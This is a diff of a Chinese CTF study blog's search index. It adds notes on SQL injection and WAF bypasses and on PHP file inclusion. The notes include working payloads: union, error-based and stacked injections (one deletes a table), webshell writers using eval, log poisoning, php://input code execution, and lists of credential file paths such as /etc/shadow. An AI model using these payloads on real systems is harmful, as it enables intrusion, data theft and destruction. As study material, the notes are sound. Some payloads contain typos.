+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#</code></pre>
+
+<ul>
+<li>报错注入</li>
+</ul>
+<p>1.extractvalue函数</p>
+<p>查询对象xml某一个标签的值</p>
+<p>如果查询的标签格式不对，就会报错</p>
+<p>利用concat函数来链接两个字符串</p>
+<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
+<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
+
+<p>-&gt;查询div，~存在会报错</p>
+<p>爆出~database（）</p>
+<p>2.updatexml</p>
+<p>更新xml文档内容</p>
+<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
+<p>同样道理，当没有对应路径的时候会报错</p>
+<p>‘ and updatexml(‘div’, concat(‘~’,database()),’hi’)#</p>
+<p>其他同上</p>
+<ul>
+<li>堆叠注入</li>
+</ul>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
+1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
+设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
+</code></pre>
+
+
+
+<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><h2 id="Episode-4-你好，绕WAF"><a href="#Episode-4-你好，绕WAF" class="headerlink" title="Episode   4  你好，绕WAF"></a>Episode   4  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
+<p>然后可以使用<code>anandd</code>绕过</p>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
+<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
+
+<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
+<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
+<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
+<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
+<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
+<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
+limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
+#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
+<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
+
+<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
+<p>最常见的一个盲注的sql语句：</p>
+<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
+
+<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
+<p>常用注释符：</p>
+<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
+<p>用法：</p>
+<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
+<p>2）使用大小写绕过：</p>
+<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
+<p>3）内联注释绕过：</p>
+<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
+<p>4） 双关键字绕过：</p>
+<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
+<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
+<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
+<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
+<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
+<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
+<h2 id="Episode-5-模糊匹配"><a href="#Episode-5-模糊匹配" class="headerlink" title="Episode 5  模糊匹配"></a>Episode 5  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
+<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
+<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
+<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
+<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
+<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
+<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
+<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
+<h2 id="奇奇怪怪的知识点积累"><a href="#奇奇怪怪的知识点积累" class="headerlink" title="奇奇怪怪的知识点积累"></a>奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
+<p>|| 逻辑或的短路：a||b</p>
+<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
+<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
+]]></content>
+      <tags>
+        <tag>-web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VNCTF2025</title>
     <url>/2025/02/10/VNCTF2025/</url>
     <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
@@ -1240,28 +1616,385 @@ if __name__ == &quot;__main__&quot;:
 <p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
 ]]></content>
       <tags>
-        <tag>-CTF -Write up</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
-<p>弱判断:bp改一下就能过</p>
-<p>增加文件头</p>
-<p>改phtml绕过</p>
-<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
-<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
-<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
+        <tag>-CTF -Writeup</tag>
       </tags>
   </entry>
   <entry>
     <title>文件包含</title>
     <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p><strong>#</strong> <strong>几个函数的区别</strong></p>
+<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+<p>只要文件中存在<code>php</code>代码都会被解析出来</p>
+<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码:</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
+	<span class="keyword">include</span>(<span class="variable">$file</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+<p>网站利用文件包含功能读取一些<code>php</code>文件，例如<code>phpinfo</code>:</p>
+<p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件。<br>（1）使用绝对路径<br>使用绝对路径直接读取:</p>
+<p>（2）使用相对路径进行读取<br>通过.&#x2F;表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用。</p>
+<p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br><code>../../windows/system.ini</code></p>
+<p>由于我的环境搭建在D盘，所以这里就不做演示了。</p>
+<p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p>
+<pre><code class="highlight plaintext">C:\boot.ini //查看系统版本
+C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
+C:\windows\repair\sam //存储Windows系统初次安装的密码
+C:\ProgramFiles\mysql\my.ini //Mysql配置
+C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
+C:\windows\php.ini //php配置信息
+Linux/Unix系统:
+
+/etc/password //账户信息
+/etc/shadow //账户密码信息
+/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
+/usr/local/app/php5/lib/php.ini //PHP相关配置
+/etc/httpd/conf/httpd.conf //Apache配置文件
+/etc/my.conf //mysql配置文件</code></pre>
+
+<p>三、LFI漏洞利用技巧<br>1.配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
+<pre><code class="highlight plaintext">&lt;?php
+	fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);
+?&gt;</code></pre>
+
+<p>找到上传点进行上传：</p>
+<p>得到文件保存的完整路径</p>
+<p>现在我们利用页面去执行我们上传的图片马</p>
+<p>有能够读取文件的php页面，直接构造url读取，代码成功解析</p>
+<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
+<p>2.包含Apache日志文件<br>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
+<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:</p>
+<p>当我们正常访问一个网页时，如&#96;<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示</a>:</p>
+<p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p>
+<pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre>
+
+<p>网页会显示403</p>
+<p>但查看日志会发现被成功记录但被编码了</p>
+<p>我们再次进行访问，并使用burp抓包，发现被编码：</p>
+<p>我们将报文修改回去，再进行发送即可：</p>
+<p>此时再查看access日志，正确写入php代码：</p>
+<p>再通过本地文件包含漏洞访问，即可执行</p>
+<p>我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p>
+<p>3.包含SESSION文件<br>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p>利用条件:</p>
+<p>找到Session内的可控变量<br>Session文件可读写，并且知道存储路径<br>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+<p>session常见存储路径:</p>
+<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。<br>相关案例可以查看这道CTF题一道CTF题：PHP文件包含</p>
+<p>4.包含临时文件</p>
+<p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
+<p>这个方法可以参考LFI With PHPInfo Assistance<br>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： XMAN夏令营-2017-babyweb-writeup</p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><h2 id="必备知识-php伪协议"><a href="#必备知识-php伪协议" class="headerlink" title="必备知识:php伪协议"></a>必备知识:php伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h3><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:off&#x2F;on</li>
+<li><code>allow_url_include</code> :off&#x2F;on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
+</li>
+<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
+relative/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
+fileInCwd.ext
+C:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.ext
+C:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
+\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
+file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>file://[文件的绝对路径和文件名]</code></p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p>
+</li>
+<li><p><code>[文件的相对路径和文件名]</code></p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p>
+</li>
+<li><p><code>[http：//网络路径和文件名]</code></p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA==.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p>
+</li>
+</ul>
+<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:off&#x2F;on</li>
+<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
+</li>
+<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php:&#x2F;&#x2F;input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;fd</td>
+<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
+<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;filter</td>
+<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong><code>php://filter</code>参数详解</strong></p>
+<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php:&#x2F;&#x2F;filter 参数</th>
+<th>描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+<td></td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td>*）分隔。</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>可用的过滤器列表（4类）</strong></p>
+<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ==.0ts2nAacIjZZ+DTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf/jsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
+<pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p>
+</li>
+<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
+<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
+[POST DATA部分]
+<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
+[POST DATA部分]
+<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=AHKgds+Ge0QaKChQ1m1oog==.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p>
+</li>
+</ul>
+<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h3><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:off&#x2F;on</li>
+<li><code>allow_url_include</code> :off&#x2F;on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
+</li>
